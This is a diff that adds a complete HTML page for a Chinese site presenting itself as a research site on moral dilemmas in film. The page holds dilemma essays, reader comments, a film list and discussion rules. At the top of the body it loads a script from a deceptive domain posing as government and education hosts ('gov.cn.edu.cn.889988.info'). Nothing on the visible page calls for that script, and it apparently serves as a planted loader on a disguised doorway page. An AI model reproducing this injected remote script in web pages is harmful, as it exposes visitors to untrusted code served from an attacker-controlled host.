@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>伦理片电影网 ｜ 影像中的道德困境研究 · 讨论责任、选择与代价</title>
+<meta name="description" content="伦理片电影网是一个专注于影像作品中道德困境与伦理议题的研究型站点。我们从责任归属、两难抉择、代价承担、边界试探四个角度，拆解电影如何用叙事逼迫观众站队，并记录每一次观影之后的思辨与讨论。">
+<meta name="keywords" content="伦理片电影网,伦理电影,道德困境,伦理议题,影像研究,责任与选择,两难抉择,伦理片推荐,电影思辨,人性讨论,叙事分析">
+<meta name="author" content="伦理片电影网研究组">
+<meta name="robots" content="index,follow">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="revisit-after" content="14 days">
+<meta property="og:site_name" content="伦理片电影网">
+<meta property="og:title" content="伦理片电影网 ｜ 影像中的道德困境研究">
+<meta property="og:description" content="从责任归属、两难抉择、代价承担、边界试探四个角度，拆解电影如何用叙事逼迫观众站队。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://lunlipiandianyingwang-zh.github.io">
+<meta name="twitter:card" content="summary">
+<link rel="canonical" href="https://lunlipiandianyingwang-zh.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--paper:#f2efe9;--ink:#1c1c1c;--deep:#2e3b36;--rust:#9c4a32;--ochre:#b08d28;--line:#c9c2b4;--mute:#7d766a}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Songti SC","SimSun","Source Han Serif SC","Noto Serif CJK SC",Georgia,serif;background:var(--paper);color:var(--ink);line-height:1.85;font-size:15.5px}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1140px;margin:0 auto;padding:0 30px}
+.sans{font-family:"Helvetica Neue","PingFang SC","Microsoft YaHei",sans-serif}
+.mono{font-family:"Courier New",monospace}
+
+/* 报眉 */
+.mast{background:var(--ink);color:#e8e5de;padding:9px 0}
+.mast .in{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;font-size:11px;letter-spacing:1.8px}
+.mast em{font-style:normal;color:#c9a66b}
+
+.menu{background:var(--paper);border-bottom:1px solid var(--ink);position:sticky;top:0;z-index:50}
+.menu .in{max-width:1140px;margin:0 auto;padding:0 30px;display:flex;justify-content:space-between;align-items:center;height:64px;gap:24px}
+.brand{font-size:22px;font-weight:700;letter-spacing:1px}
+.brand b{font-weight:700;color:var(--rust)}
+.nav{display:flex;gap:26px;font-size:13.5px}
+.nav a{border-bottom:2px solid transparent;padding:4px 0}
+.nav a:hover,.nav a.on{border-bottom-color:var(--rust);color:var(--rust)}
+
+/* 报头 */
+.masthead{border-bottom:3px double var(--ink);padding:60px 0 38px;text-align:center}
+.masthead .kicker{font-size:11px;letter-spacing:6px;color:var(--mute);margin-bottom:20px}
+.masthead h1{font-size:clamp(40px,8.5vw,104px);font-weight:700;letter-spacing:6px;line-height:1.15}
+.masthead h1 span{display:inline-block;background:var(--rust);color:#fff;padding:0 16px;transform:translateY(-6px)}
+.masthead .rule{width:64px;height:1px;background:var(--rust);margin:26px auto}
+.masthead p{font-size:15px;color:var(--deep);max-width:640px;margin:0 auto;font-style:italic}
+
+/* 编辑部声明条 */
+.editor{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border-bottom:1px solid var(--ink)}
+.editor div{padding:20px 22px;border-right:1px solid var(--line)}
+.editor div:last-child{border-right:none}
+.editor dt{font-size:10.5px;letter-spacing:2px;color:var(--mute);text-transform:uppercase;margin-bottom:7px}
+.editor dd{font-size:14px;line-height:1.6}
+
+/* 章节头 */
+.sec{padding:84px 0;border-bottom:1px solid var(--line)}
+.ch{display:flex;align-items:baseline;gap:18px;border-bottom:1px solid var(--ink);padding-bottom:16px;margin-bottom:44px;flex-wrap:wrap}
+.ch .n{font-size:12px;letter-spacing:2px;background:var(--ink);color:#fff;padding:5px 11px}
+.ch h2{font-size:34px;font-weight:700;letter-spacing:1px}
+.ch h2 i{font-style:normal;color:var(--rust)}
+.ch .lead{flex:1;min-width:260px;font-size:13.5px;color:var(--mute);text-align:right}
+.ch a.cta{font-size:12px;border-bottom:1px solid var(--ink);padding-bottom:2px}
+
+/* 议题 */
+.dilemmas{display:grid;grid-template-columns:repeat(2,1fr);gap:26px}
+.di{display:grid;grid-template-columns:96px 1fr;border:1px solid var(--ink);background:#f7f5f0}
+.di .side{background:var(--deep);color:#e8e5de;padding:22px 14px;display:flex;flex-direction:column;gap:10px;align-items:center;text-align:center}
+.di .side b{font-size:11px;letter-spacing:1.5px;color:#c9a66b}
+.di .side em{font-style:normal;font-size:28px;font-weight:700;line-height:1}
+.di .body{padding:24px}
+.di .body .tag{font-size:11px;letter-spacing:1.5px;color:var(--rust);border:1px solid var(--rust);padding:2px 8px;display:inline-block;margin-bottom:12px}
+.di .body h4{font-size:19.5px;font-weight:700;margin-bottom:10px;line-height:1.5}
+.di .body p{font-size:14px;color:#4a4a48}
+.di .body .q{margin-top:14px;padding-top:12px;border-top:1px dashed var(--line);font-size:13.5px;font-style:italic;color:var(--deep)}
+.di.rust .side{background:var(--rust)}
+.di.ochre .side{background:var(--ochre)}
+
+/* 拆解 三段式 */
+.decon{display:grid;grid-template-columns:repeat(3,1fr);gap:0;border:1px solid var(--ink)}
+.step{padding:30px 26px;background:#f7f5f0;border-right:1px solid var(--ink)}
+.step:last-child{border-right:none}
+.step .ord{font-size:11px;letter-spacing:3px;color:var(--rust);margin-bottom:14px}
+.step h4{font-size:18.5px;font-weight:700;margin-bottom:12px}
+.step p{font-size:14px;color:#4a4a48}
+.step .pull{margin-top:20px;padding:14px;border-left:3px solid var(--rust);background:#fffdf8;font-size:13.5px;line-height:1.75}
+.step:nth-child(2){background:#fffdf8}
+.step:nth-child(3){background:#f0eee7}
+
+/* 观点墙 */
+.wall{column-count:3;column-gap:26px;column-rule:1px solid var(--line)}
+.note{break-inside:avoid;border:1px solid var(--line);background:#f7f5f0;padding:20px 22px;margin-bottom:20px}
+.note .who{display:flex;justify-content:space-between;font-size:11.5px;color:var(--rust);letter-spacing:1px;margin-bottom:10px}
+.note h5{font-size:16px;font-weight:700;margin-bottom:9px;line-height:1.5}
+.note p{font-size:13.5px;color:#4a4a48}
+.note.dark{background:var(--ink);color:#e8e5de;border-color:var(--ink)}
+.note.dark h5{color:#fff}
+.note.dark p{color:#c9c2b4}
+.note.dark .who{color:#c9a66b}
+
+/* 片单 表 */
+.list{width:100%;border-collapse:collapse;border:1px solid var(--ink);background:#fff}
+.list th{background:var(--ink);color:#fff;font-size:11.5px;letter-spacing:2px;text-align:left;padding:13px 16px;font-weight:600}
+.list td{padding:15px 16px;border-bottom:1px solid var(--line);font-size:14px;vertical-align:top}
+.list tr:last-child td{border-bottom:none}
+.list tr:hover td{background:#fbf9f4}
+.list .num{font-family:"Courier New",monospace;color:var(--mute);font-size:12.5px;width:60px}
+.list .name{font-weight:700;width:26%}
+.list .name small{display:block;font-weight:400;font-size:12px;color:var(--mute);letter-spacing:.5px;margin-top:3px}
+.list .theme{color:var(--rust);font-size:12.5px;width:15%}
+.list .arrow{width:56px;text-align:center;color:var(--rust);font-size:15px}
+.list tbody tr td:first-child{padding-left:16px}
+
+/* 讨论 表单区 */
+.talk{display:grid;grid-template-columns:1.1fr .9fr;gap:34px}
+.qa{border:1px solid var(--ink);background:#f7f5f0}
+.qa .item{border-bottom:1px solid var(--line);padding:20px 24px}
+.qa .item:last-child{border-bottom:none}
+.qa .q{font-size:15.5px;font-weight:700;margin-bottom:8px}
+.qa .q:before{content:"问";display:inline-block;background:var(--rust);color:#fff;font-size:11px;padding:2px 7px;margin-right:9px;vertical-align:2px}
+.qa .a{font-size:13.5px;color:#4a4a48;padding-left:0}
+.qa .a:before{content:"答";display:inline-block;background:var(--deep);color:#fff;font-size:11px;padding:2px 7px;margin-right:9px;vertical-align:2px}
+.rulebox{border:1px solid var(--ink);padding:26px;background:#fffdf8}
+.rulebox h4{font-size:18px;font-weight:700;margin-bottom:16px;color:var(--rust)}
+.rulebox ol{padding-left:20px}
+.rulebox li{font-size:13.5px;padding:5px 0;color:#4a4a48}
+.rulebox .sign{margin-top:22px;padding-top:16px;border-top:1px solid var(--line);font-size:12.5px;color:var(--mute)}
+
+/* 页脚 */
+footer{background:var(--ink);color:#c9c2b4;padding:66px 0 0}
+.f{max-width:1140px;margin:0 auto;padding:0 30px 40px;display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:36px}
+.f .lo{font-size:26px;font-weight:700;color:#fff;letter-spacing:2px;margin-bottom:14px}
+.f .lo b{color:#c9a66b}
+.f p{font-size:13.5px;line-height:1.9;max-width:400px}
+.f h6{color:#fff;font-size:11px;letter-spacing:2.5px;margin-bottom:18px}
+.f li{padding:6px 0;font-size:13.5px}
+.f li a:hover{color:#c9a66b}
+.sitebox{margin-top:24px;border:1px solid #c9a66b;padding:16px;text-align:center}
+.sitebox b{display:block;font-size:10px;letter-spacing:4px;color:var(--mute);margin-bottom:8px}
+.sitebox a{color:#fff;font-size:15px;word-break:break-all}
+.bot{max-width:1140px;margin:0 auto;padding:22px 30px;border-top:1px solid #4a4a48;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;font-size:12px;color:var(--mute)}
+.bot a{color:#c9c2b4}
+
+@media(max-width:920px){
+  .nav{gap:16px;font-size:12.5px}
+  .editor{grid-template-columns:1fr 1fr}
+  .editor div:nth-child(2){border-right:none}
+  .dilemmas,.talk{grid-template-columns:1fr}
+  .decon{grid-template-columns:1fr}
+  .step{border-right:none;border-bottom:1px solid var(--ink)}
+  .step:last-child{border-bottom:none}
+  .wall{column-count:2}
+  .ch .lead{text-align:left}
+}
+@media(max-width:620px){
+  .wrap,.f,.bot{padding-left:16px;padding-right:16px}
+  .masthead{padding:42px 0 28px}
+  .editor{grid-template-columns:1fr}.editor div{border-right:none;border-bottom:1px solid var(--line)}
+  .editor div:last-child{border-bottom:none}
+  .wall{column-count:1}
+  .di{grid-template-columns:1fr}
+  .di .side{flex-direction:row;justify-content:center;gap:14px;padding:14px}
+  .f{grid-template-columns:1fr}
+  .ch h2{font-size:26px}
+  .list .theme,.list .arrow{display:none}
+  .list td{padding:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="mast"><div class="in wrap">
+  <span>伦理片电影网 · 研究组 <em>RESEARCH UNIT</em></span>
+  <span>讨论责任、选择与代价 · 不涉及现实伦理判断，仅作影像文本分析</span>
+</div></div>
+
+<div class="menu"><div class="in">
+  <div class="brand sans">伦理片<b>电影网</b></div>
+  <nav class="nav sans">
+    <a href="#issue" class="on">伦理议题</a>
+    <a href="#decon">拆解方法</a>
+    <a href="#voice">读者观点</a>
+    <a href="#list">片单档案</a>
+    <a href="#rule">讨论边界</a>
+  </nav>
+</div></div>
+
+<!-- 报头 -->
+<header class="masthead wrap">
+  <div class="kicker">ETHICS IN CINEMA · 影像伦理研究</div>
+  <h1>当银幕逼你<br><span>做出选择</span></h1>
+  <div class="rule"></div>
+  <p>我们不做道德审判，只拆解叙事。一部作品如何让观众在两种"都对"的答案之间站队，才是值得被反复讨论的地方。</p>
+</header>
+
+<!-- 编辑部声明 -->
+<div class="wrap editor sans"><dl>
+  <div><dt>研究立场</dt><dd>影像文本分析，不替代法律与道德判断</dd></div>
+  <div><dt>讨论范围</dt><dd>责任归属、两难抉择、代价承担、边界试探</dd></div>
+  <div><dt>更新频率</dt><dd>每月两篇长文 + 一期读者圆桌</dd></div>
+  <div><dt>当前归档</dt><dd>共 86 部作品，覆盖 1970s—2026</dd></div>
+</dl></div>
+
+<!-- 01 伦理议题 -->
+<section class="sec wrap" id="issue">
+  <div class="ch"><span class="n sans">01</span><h2>伦理<em>议题</em></h2><span class="lead sans">四个反复出现的困境结构，绝大多数作品都逃不出这几种框架</span><a href="#" class="cta sans">查看全部议题 ›</a></div>
+  <div class="dilemmas">
+    <article class="di">
+      <div class="side"><b>议题 01</b><em>A</em></div>
+      <div class="body"><span class="tag">责任归属</span>
+        <h4>谁该为那个决定负责</h4>
+        <p>命令来自上层，执行落在手上，后果由第三方承担。我们拆解电影如何把责任一层层拆解，又用哪个镜头让观众最终把视线落在某个人身上。</p>
+        <div class="q">讨论题：如果执行者只是"照办"，观众是否仍有权责怪他？</div>
+      </div>
+    </article>
+    <article class="di rust">
+      <div class="side"><b>议题 02</b><em>B</em></div>
+      <div class="body"><span class="tag">两难抉择</span>
+        <h4>两个答案都对的时候</h4>
+        <p>救一个人必须牺牲另一个，守住承诺就要背叛信任。分析影片如何用剪辑节奏和时间压力，把"选择"这件事逼到没有退路的境地。</p>
+        <div class="q">讨论题：在只剩五秒的时间里，观众的判断还算是理性选择吗？</div>
+      </div>
+    </article>
+    <article class="di ochre">
+      <div class="side"><b>议题 03</b><em>C</em></div>
+      <div class="body"><span class="tag">代价承担</span>
+        <h4>谁来支付这份善意</h4>
+        <p>好意未必带来好结果。我们把目光放在被代价压住的那个人身上——影片如何让观众意识到，自己的同情可能一直给错了对象。</p>
+        <div class="q">讨论题：动机干净，是否足以抵消后果？</div>
+      </div>
+    </article>
+    <article class="di">
+      <div class="side"><b>议题 04</b><em>D</em></div>
+      <div class="body"><span class="tag">边界试探</span>
+        <h4>底线到底画在哪里</h4>
+        <p>谎言、隐瞒、替人决定——那些看起来"还不算太糟"的动作，如何一步步把角色推到无法回头的那一侧，是这类作品最容易被忽略的段落。</p>
+        <div class="q">讨论题：第一次越线被原谅之后，底线还能叫底线吗？</div>
+      </div>
+    </article>
+  </div>
+</section>
+
+<!-- 02 拆解方法 -->
+<section class="sec wrap" id="decon">
+  <div class="ch"><span class="n sans">02</span><h2>拆解<em>方法</em></h2><span class="lead sans">我们用三段式结构分析每一部作品，避免停留在"好人坏人"的表层判断</span><a href="#" class="cta sans">方法说明 ›</a></div>
+  <div class="decon">
+    <div class="step"><div class="ord sans">STEP 01</div><h4>确立前提</h4>
+      <p>先厘清作品给出的一组前提：人物的处境、拥有的信息、可以调用的资源，以及那些不可更改的约束条件。</p>
+      <div class="pull">没有前提的讨论是情绪宣泄；同一个选择，换一组前提结论往往完全不同。</div></div>
+    <div class="step"><div class="ord sans">STEP 02</div><h4>追踪转向</h4>
+      <p>找出人物态度第一次发生偏移的那个时刻——通常只有几秒钟，却决定了整条故事线的走向。</p>
+      <div class="pull">我们把这个瞬间称为"转向点"。它往往被藏在对话、沉默或一次转身里。</div></div>
+    <div class="step"><div class="ord sans">STEP 03</div><h4>追问代价</h4>
+      <p>不评价选择的对错，而是追问：谁为此付出了什么，以及这笔代价是否在镜头里被如实呈现。</p>
+      <div class="pull">代价被省略，往往是作品立场最明确的表态方式。</div></div>
+  </div>
+</section>
+
+<!-- 03 读者观点 -->
+<section class="sec wrap" id="voice">
+  <div class="ch"><span class="n sans">03</span><h2>读者<em>观点</em></h2><span class="lead sans">来自读者圆桌的节选，保留分歧，不追求共识</span><a href="#" class="cta sans">参与圆桌 ›</a></div>
+  <div class="wall">
+    <div class="note dark"><div class="who sans"><span>读者 07</span><span>议题 A</span></div><h5>服从不等于免责</h5><p>作品把镜头给了执行者的手，却刻意避开了他的眼睛。这种视线的缺席本身就是一种判断。</p></div>
+    <div class="note"><div class="who sans"><span>读者 12</span><span>议题 B</span></div><h5>五秒内的选择算不上选择</h5><p>我更愿意把那种场景理解为"被迫接受"，而不是道德抉择。用时间压迫来制造戏剧性，代价是把责任问题简化了。</p></div>
+    <div class="note"><div class="who sans"><span>读者 03</span><span>议题 C</span></div><h5>观众也参与了分配</h5><p>我们同情谁，其实是在替作品决定代价该由谁承担。这个动作几乎是自动完成的，很少有人意识到。</p></div>
+    <div class="note dark"><div class="who sans"><span>读者 21</span><span>议题 D</span></div><h5>第一次越线最值得被讨论</h5><p>后来的所有选择都只是逻辑结果。真正的问题是那一步发生时，周围的人为什么都觉得"还可以"。</p></div>
+    <div class="note"><div class="who sans"><span>读者 15</span><span>议题 A</span></div><h5>旁观者也有位置</h5><p>多数讨论集中在行动者身上，但作品里那个"看见却没说话"的角色，往往承担了更重要的功能。</p></div>
+    <div class="note"><div class="who sans"><span>读者 09</span><span>议题 B</span></div><h5>选择之后的沉默</h5><p>真正动人的不是选择瞬间，而是三个镜头之后人物怎么坐、怎么看窗外。那才是代价真正落下的时刻。</p></div>
+    <div class="note dark"><div class="who sans"><span>读者 26</span><span>议题 D</span></div><h5>底线是被关系定义的</h5><p>同一件事发生在陌生人身上会被判断为"越界"，发生在家人身上却可能被解读为"不得已"。作品正是靠这种弹性制造张力。</p></div>
+  </div>
+</section>
+
+<!-- 04 片单档案 -->
+<section class="sec wrap" id="list">
+  <div class="ch"><span class="n sans">04</span><h2>片单<em>档案</em></h2><span class="lead sans">按核心伦理议题归类，标注主要争议点与讨论入口</span><a href="#" class="cta sans">完整片单 ›</a></div>
+  <table class="list sans">
+    <thead><tr><th>编号</th><th>作品与年份</th><th>核心议题</th><th>主要争议点</th><th></th></tr></thead>
+    <tbody>
+      <tr><td class="num">086</td><td class="name">本期主打长片<small>2025 · 剧情</small></td><td class="theme">责任归属</td><td>命令链中每一环都"只是执行"，最终镜头却落在最末端那个人身上</td><td class="arrow">→</td></tr>
+      <tr><td class="num">085</td><td class="name">欧洲独立剧情片<small>2024 · 伦理</small></td><td class="theme">两难抉择</td><td>五秒内完成的二选一，用长镜头把观众一并锁进时间压力里</td><td class="arrow">→</td></tr>
+      <tr><td class="num">084</td><td class="name">东亚家庭伦理片<small>2024 · 家庭</small></td><td class="theme">代价承担</td><td>善意由一个人发起，代价由另一个人支付，两人全程没有对话</td><td class="arrow">→</td></tr>
+      <tr><td class="num">083</td><td class="name">拉美现实主义新作<small>2023 · 社会</small></td><td class="theme">边界试探</td><td>从一次"无害"的隐瞒开始，到第七次选择时无人再讨论对错</td><td class="arrow">→</td></tr>
+      <tr><td class="num">082</td><td class="name">亚洲悬疑剧情片<small>2023 · 悬疑</small></td><td class="theme">责任归属</td><td>叙事视角的切换本身，就是立场的一次重新分配</td><td class="arrow">→</td></tr>
+      <tr><td class="num">081</td><td class="name">欧洲作者电影<small>2022 · 作者</small></td><td class="theme">两难抉择</td><td>角色最终没有选择，而这个"不选择"成为全片唯一明确的态度</td><td class="arrow">→</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- 05 讨论边界 -->
+<section class="sec wrap" id="rule" style="border-bottom:none">
+  <div class="ch"><span class="n sans">05</span><h2>讨论<em>边界</em></h2><span class="lead sans">我们讨论影像如何呈现伦理，不讨论现实中应如何处置</span><a href="#" class="cta sans">完整说明 ›</a></div>
+  <div class="talk">
+    <div class="qa sans">
+      <div class="item"><div class="q">这里的"伦理片"指什么？</div><div class="a">指那些把道德困境置于叙事中心的作品。我们不按题材限定，也不给作品贴"伦理片"或"非伦理片"的标签——同一个动作在不同关系里意义完全不同。</div></div>
+      <div class="item"><div class="q">讨论是否会有立场倾向？</div><div class="a">会，但立场只针对文本，不针对现实中的人。我们的目标不是说服读者接受某个结论，而是让结论形成的过程变得可见。</div></div>
+      <div class="item"><div class="q">为什么不做对错判断？</div><div class="a">因为一旦下结论，讨论就结束了。而这类作品最有价值的部分，恰恰在结论之前那一段漫长的不确定里。</div></div>
+      <div class="item"><div class="q">读者可以贡献什么？</div><div class="a">欢迎提交希望被拆解的作品、指出我们遗漏的转向点，或补充另一种解释路径。每期圆桌都会收录读者观点，保留分歧。</div></div>
+    </div>
+    <div class="rulebox sans">
+      <h4>我们的四条讨论原则</h4>
+      <ol>
+        <li>区分作品中的角色与现实中作出相似选择的人，两者不在同一层面被评价。</li>
+        <li>尊重每一种解释路径，但不接受脱离文本的个人攻击与情绪宣泄。</li>
+        <li>争议点的标注只描述"哪里产生了分歧"，不下结论谁对谁错。</li>
+        <li>引用涉及剧透的内容会明确标注，方便读者自行决定是否阅读。</li>
+      </ol>
+      <div class="sign">伦理片电影网 · 研究组 ｜ 每月更新，欢迎来信参与圆桌讨论</div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="f sans">
+    <div><div class="lo">伦理片<b>电影网</b></div>
+      <p>影像中的道德困境研究：讨论责任、选择与代价。拆解电影如何用叙事逼迫观众站队，并记录每一次观影之后的思辨与讨论。共 86 部作品归档。</p>
+      <div class="sitebox"><b>// OFFICIAL DOMAIN</b><a href="https://lunlipiandianyingwang-zh.github.io">lunlipiandianyingwang-zh.github.io</a></div>
+    </div>
+    <div><h6>研究栏目</h6><ul>
+      <li><a href="#issue">伦理议题</a></li>
+      <li><a href="#decon">拆解方法</a></li>
+      <li><a href="#voice">读者观点</a></li>
+      <li><a href="#list">片单档案</a></li>
+      <li><a href="#rule">讨论边界</a></li>
+    </ul></div>
+    <div><h6>议题索引</h6><ul>
+      <li><a href="#">责任归属</a></li>
+      <li><a href="#">两难抉择</a></li>
+      <li><a href="#">代价承担</a></li>
+      <li><a href="#">边界试探</a></li>
+      <li><a href="#">叙事视角与立场</a></li>
+    </ul></div>
+    <div><h6>参与入口</h6><ul>
+      <li><a href="#">读者圆桌</a></li>
+      <li><a href="#">投稿作品</a></li>
+      <li><a href="#">邮件订阅</a></li>
+      <li><a href="#">研究说明</a></li>
+      <li><a href="#">隐私说明</a></li>
+    </ul></div>
+  </div>
+  <div class="bot sans"><span>© 2026 伦理片电影网 · lunlipiandianyingwang-zh.github.io · 影像中的道德困境研究</span><span><a href="#">回到顶部 ↑</a></span></div>
+</footer>
+</body>
+</html>
